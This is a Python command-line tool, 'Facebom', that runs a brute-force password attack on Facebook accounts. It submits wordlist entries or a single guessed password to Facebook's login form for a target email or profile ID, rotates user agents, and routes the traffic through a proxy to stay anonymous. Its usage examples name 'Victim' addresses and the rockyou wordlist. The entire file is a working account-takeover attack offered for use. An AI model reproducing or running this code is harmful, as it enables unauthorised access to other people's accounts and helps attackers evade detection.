#!/usr/bin/python
# -*- coding: utf-8 -*-
######################
# SCRIPT : Facebom
#    JOB : Brute Force Attack On Facebook Accounts
#Codedby : Oseid Aldary
######################

import socket, sys, os, re, random, optparse, time

## COLORS ###############
wi="\033[1;37m" #>>White#
rd="\033[1;31m" #>Red   #
gr="\033[1;32m" #>Green #
yl="\033[1;33m" #>Yellow#
#########################

os.system("cls||clear")
errMsg = lambda msg: rd+"\n["+yl+"!"+rd+"] Error: "+yl+msg+rd+ " !!!\n"+wi


try:import requests
except ImportError:
    print(errMsg("[ requests ] module is missing"))
    print("  [*] Please Use: 'pip install requests' to install it :)")
    sys.exit(1)

try:import mechanize
except ImportError:
    print(errMsg("[ mechanize ] module is missing"))
    print("  [*] Please Use: 'pip install mechanize' to install it :)")
    sys.exit(1)


class FaceBoom(object):


    def __init__(self, target=None, target_profile=None,singal_passwd=None, wordlist=None, proxy=None):

        self.br = mechanize.Browser()
        self.br.set_handle_robots(False)
        self.br.addheaders=[('User-agent',self.get_random_user_agent())]
        self.target = target
        self.target_profile = target_profile
        self.singal_passwd = singal_passwd
        self.wordlist = wordlist
        self.proxy = proxy
        self.useProxy = False
        if self.wordlist:
            if not os.path.isfile(self.wordlist):
                print(errMsg("Please check Your Wordlist Path"))
                sys.exit(1)
        if not self.cnet():
            print(errMsg("Please Check Your Internet Connection"))
            sys.exit(1)
            
        if self.proxy:
             print(wi+"["+yl+"~"+wi+"] Connecting To "+wi+"Proxy[\033[1;33m {} \033[1;37m]...".format(self.proxy if not ":" in self.proxy else self.proxy.split(":")[0]))
             if self.proxy.count(".") != 3:
                    print(errMsg("Invalid IPv4 ["+rd+str(self.proxy)+yl+"]"))
                    sys.exit(1)
             check = self.proxy+":8080" if not ":" in self.proxy else self.proxy
             print("check", check)
             if self.check_proxy(check):
                print(wi+"["+gr+"Connected"+wi+"]")
                self.useProxy = check
                self.br.set_proxies({'https':self.useProxy, 'http':self.useProxy})
             else:
                print(errMsg("Connection Failed"))
                print(errMsg("Invalid HTTPS Proxy["+rd+str(self.proxy)+yl+"]"))
                sys.exit(1)

    get_random_user_agent = staticmethod(lambda: random.choice([
               'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534.24 (KHTML, like Gecko) RockMelt/0.9.58.494 Chrome/11.0.696.71 Safari/534.24',
               'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36',
               'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.874.54 Safari/535.2',
               'Opera/9.80 (J2ME/MIDP; Opera Mini/9.80 (S60; SymbOS; Opera Mobi/23.348; U; en) Presto/2.5.25 Version/10.54',
               'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.12 Safari/535.11',
               'Mozilla/5.0 (Windows NT 5.1) AppleWebKit/535.6 (KHTML, like Gecko) Chrome/16.0.897.0 Safari/535.6',
               'Mozilla/5.0 (X11; Linux x86_64; rv:17.0) Gecko/20121202 Firefox/17.0 Iceweasel/17.0.1']))


    def check_proxy(self,proxy):
          proxies = {'https':"https://"+proxy, 'http':"http://"+proxy}
          proxy_ip = proxy.split(":")[0]
          try:
            r = requests.get('https://www.wikipedia.org',proxies=proxies, timeout=5)
            if proxy_ip==r.headers['X-Client-IP']: return True
            return False
          except Exception : return False


    @staticmethod
    def cnet():
        try:
            socket.create_connection((socket.gethostbyname("www.google.com"), 80), 2)
            return True
        except socket.error:pass
        return False

    @property
    def get_profile_id(self):
        proxies = {} if not self.useProxy else {'https':self.useProxy, 'http':self.useProxy}
        try:
            print(gr+"\n["+wi+"*"+gr+"] geting target Profile Id... please wait"+wi)
            idre = re.compile('"entity_id":"([0-9]+)"')
            con = requests.get(self.target_profile, proxies=proxies, timeout=5).content
            idis = idre.findall(con)
            print(wi+"\n["+gr+"+"+wi+"]"+gr+" Target Profile"+wi+" ID: "+yl+idis[0]+wi)
        except IndexError:
            print(errMsg("Please Check Your Victim's Profile URL"))
            sys.exit(1)

    def login(self, password):
        self.br.open("https://facebook.com")
        self.br.select_form(nr=0)
        self.br.form['email']=self.target
        self.br.form['pass']=password
        self.br.method ="POST"
        return  self.br.submit().get_data().__contains__(b'home_icon')

    def banner(self):

        proxystatus =wi+"["+gr+"ON"+wi+"]" if self.useProxy  else yl+"["+rd+"OFF"+yl+"]"
        print(gr+"""
==================================
[---]        """+wi+"""Facebom"""+gr+"""         [---]
==================================
[---]  """+wi+"""BruteForce Facebook  """+gr+""" [---]
==================================
[---]         """+yl+"""CONFIG"""+gr+"""         [---]
==================================
[>] Target      :> """+wi+self.target+gr+"""
{}""".format("[>] Wordlist    :> "+yl+str(self.wordlist) if not self.singal_passwd else "[>] Password    :> "+yl+str(self.singal_passwd))+gr+"""
[>] ProxyStatus :> """+str(proxystatus)+wi)
        if not self.singal_passwd:
            print(gr+"""\
=================================="""+wi+"""
[~] """+yl+"""Brute"""+rd+""" ForceATTACK: """+gr+"""Enabled """+wi+"""[~]"""+gr+"""
==================================\n"""+wi)

    def start(self):
        if self.target_profile:
            self.get_profile_id
            sys.exit(1)
            
        if self.target:
            self.banner()
            if self.singal_passwd:
                passwd = self.singal_passwd.strip()
                if len(passwd) <6:
                    print(errMsg("Invalid Password"))
                    sys.exit(1)
                try:
                  sys.stdout.write(wi+"\n["+yl+"~"+wi+"] Trying Single Password[ {"+yl+str(passwd)+wi+"} ]")
                  sys.stdout.flush()
                  if self.login(passwd):
                     sys.stdout.write(wi+" ==> Login"+gr+" Success\n")
                     print(wi+"========================="+"="*len(passwd)+"======")
                     print(wi+"["+gr+"+"+wi+"] Password [ "+gr+passwd+wi+" ]"+gr+" Is Correct :)")
                     print(wi+"========================="+"="*len(passwd)+"======")
                  else :
                    sys.stdout.write(yl+" ==> Login"+rd+" Failed\n"+wi)
                    print(yl+"\n["+rd+"!"+yl+"] Sorry: "+wi+"The Password[ "+yl+passwd+wi+" ] Is Not Correct"+rd+":("+yl+"!"+wi)
                    print(gr+"["+yl+"!"+gr+"]"+yl+" Please Try Another password or Wordlist "+gr+":)"+wi)
                except(KeyboardInterrupt, EOFError):
                    print(rd+"\n["+yl+"!"+rd+"]"+yl+" Aborting"+rd+"..."+wi)
                    time.sleep(1.5)
                    sys.exit(1)
                except Exception as e:
                    print(rd+"\n["+yl+"!"+rd+"] Error: "+yl+str(e)+wi)
                    sys.exit(1)
            if self.wordlist:
                loop = 1
                with open(self.wordlist) as wlist:
                    for passwd in wlist:
                        passwd = passwd.strip()
                        if not passwd or len(passwd) <6:continue
                        sys.stdout.write(wi+"["+yl+str(loop)+wi+"] Trying Password[ {"+yl+str(passwd)+wi+"} ]")
                        sys.stdout.flush()
                        try:
                          if self.login(passwd):
                             sys.stdout.write(wi+" ==> Login"+gr+" Success\n")
                             print(wi+"========================="+"="*len(passwd)+"======")
                             print(wi+"["+gr+"+"+wi+"] Password [ "+gr+passwd+wi+" ]"+gr+" Is Correct :)")
                             print(wi+"========================="+"="*len(passwd)+"======")
                             break
                          else:sys.stdout.write(yl+" ==> Login"+rd+" Failed\n")
                          loop+=1
                        except(KeyboardInterrupt, EOFError):
                              print(rd+"\n["+yl+"!"+rd+"]"+yl+" Aborting"+rd+"..."+wi)
                              time.sleep(1.5)
                              sys.exit(1)
                        except Exception as e:
                              print(rd+"["+yl+"!"+rd+"] Error: "+yl+str(e)+wi)
                              time.sleep(0.60)
                    else:
                          print(yl+"\n["+rd+"!"+yl+"] Sorry: "+wi+"I Can't Find The Correct Password In [ "+yl+self.wordlist+wi+" ] "+rd+":("+yl+"!"+wi)
                          print(gr+"["+yl+"!"+gr+"]"+yl+" Please Try Another Wordlist. "+gr+":)"+wi)
            sys.exit(1)

parse = optparse.OptionParser(wi+"""
Usage: python ./facebom.py [OPTIONS...]
-------------
OPTIONS:
       |
    |--------
    | -t <target email> [OR] <FACEBOOK ID>    ::> Specify target Email [OR] Target Profile ID
    |--------
    | -w <wordlist Path>                      ::> Specify Wordlist File Path
    |--------
    | -s <single password>                    ::> Specify Single Password To Check
    |--------
    | -p <Proxy IP:PORT>                      ::> Specify HTTP/S Proxy (Optional)
    |--------
    | -g <TARGET Facebook Profile URL>        ::> Specify Target Facebook Profile URL For Get HIS ID
-------------
Examples:
        |
     |--------
     | python facebom.py -t Victim@gmail.com -w /usr/share/wordlists/rockyou.txt
     |--------
     | python Facebom.py -t 100001013078780 -w C:\\Users\\Me\\Desktop\\wordlist.txt
     |--------
     | python facebom.py -t Victim@hotmail.com -w D:\\wordlist.txt -p 35.236.37.121 default(port=8080)
     |--------
     | python facebom.py -t Victim@gmail.com -s 1234567
     |--------
     | python facebom.py -g https://www.facebook.com/alanwalker97
     |--------
""")


def Main():
   parse.add_option("-t","--target",'-T','--TARGET',dest="taremail",type="string",
      help="Specify Target Email ")
   parse.add_option("-w","--wordlist",'-W','--WORDLIST',dest="wlst",type="string",
      help="Specify Wordlist File ")
   parse.add_option("-s","--singe","--S","--SINGLE",dest="single",type="string",
      help="Specify Single Password To Check it")
   parse.add_option("-p","-P","--proxy","--PROXY",dest="proxy",type="string",
                        help="Specify HTTP/S Proxy To Be Anonymous When Attack Enable")
   parse.add_option("-g","-G","--getid","--GETID",dest="url",type="string",
                        help="Specify TARGET FACEBOOK PROFILE URL")
   (options,args) = parse.parse_args()

   if options.taremail !=None and options.wlst !=None and options.proxy !=None:
       FBOM = FaceBoom(target=options.taremail, wordlist=options.wlst, proxy=options.proxy)
       FBOM.start()
   elif options.taremail !=None and options.single !=None and options.proxy !=None:
       FBOM = FaceBoom(target=options.taremail, singal_passwd=options.single, proxy=options.proxy)
       FBOM.start()

   elif options.taremail !=None and options.single !=None:
       FBOM = FaceBoom(target=options.taremail,singal_passwd=options.single)
       FBOM.start()
   elif options.taremail !=None and options.wlst !=None:
       FBOM = FaceBoom(target=options.taremail, wordlist=options.wlst)
       FBOM.start()
   elif options.url !=None and options.proxy != None:
       FBOM = FaceBoom(target_profile=options.url, proxy=options.proxy)
       FBOM.start()
   elif options.url != None:
       FBOM = FaceBoom(target_profile=options.url)
       FBOM.start()
   else:
       print(parse.usage)
       exit(1)

if __name__=='__main__':
  Main()

##############################################################
#####################                #########################
#####################   END OF TOOL  #########################
#####################                #########################
##############################################################
#This Tool by Oseid Aldary
#Have a nice day :)
#GoodBye
